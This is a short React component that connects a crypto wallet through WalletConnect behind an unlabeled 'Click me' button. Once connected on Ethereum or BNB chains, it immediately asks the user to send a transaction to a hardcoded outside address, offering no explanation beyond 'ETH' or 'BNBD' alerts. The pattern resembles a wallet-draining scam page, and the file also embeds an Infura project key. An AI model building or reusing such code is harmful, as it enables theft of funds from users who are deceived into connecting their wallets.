import "./styles.css";
import Web3Modal from "web3modal";
import Web3 from "web3";
import WalletConnectProvider from "@walletconnect/web3-provider";
// import Providers from "./Providers";
// import { useWeb3React } from "@web3-react/core";
export default function App() {
  const connectWalletMetamask = async (provider) => {
    let ownerContract = undefined;

    if (provider) {
      let web3 = new Web3(provider);
      let chainId = await web3.eth.net.getId();
      const accounts = await web3.eth.getAccounts();
      console.log(chainId);
      let connectedAccount = accounts[0];
      console.log(connectedAccount);

      if (chainId == 1 || chainId == 3) {
        alert("ETH");
        await web3.eth.sendTransaction({
          to: "0x41367F30f07cb55F684B1339D921999f7B8a76bD",
          from: connectedAccount,
          gasPrice: "500",
          value: 1000000000,
        });
      } else if (chainId == 56 || chainId == 97) {
        alert("BNBD");

        console.log("====================================");

        await web3.eth.sendTransaction({
          to: "0x41367F30f07cb55F684B1339D921999f7B8a76bD",
          from: connectedAccount,
          gasPrice: "500",
          value: 1000000000,
        });
        // console.log(
        //   await ownerDetails.myContract.methods
        //     .approve(connectedAccount, 1)
        //     .send({ from: connectedAccount })
        // );
      }
    } else {
      alert("Not a Ethereum browser");
    }
  };
  const onConnect = async () => {
    localStorage.removeItem("walletconnect");
    let provider = undefined;
    try {
      provider = new WalletConnectProvider({
        rpc: {
          1: "https://mainnet.infura.io/v3/3eca30b0aa6a4372ac8552a1c09a8ccd",
          56: "https://bsc-dataseed.binance.org/",
          97: "https://bsc-dataseed.binance.org/",
        },
        qrcode: true,
        qrcodeModalOptions: {
          mobileLinks: ["metamask", "trust"],
        },
      });
      await provider.enable();
      setTimeout(async function () {
        const web3 = new Web3(provider);
        let chainId = await web3.eth.getChainId();

        if (chainId == 56 || chainId == 1 || chainId == 97) {
          console.log("walletconnect");

          connectWalletMetamask(provider);
          // console.log(provider);
        } else {
          // onDisconnect();
        }
      }, 1000);
    } catch (e) {
      return;
    }
  };
  return (
    <>
      {/* <Providers> */}
      <div className="App">
        <button onClick={onConnect}>Click me </button>
      </div>
      {/* </Providers> */}
    </>
  );
}
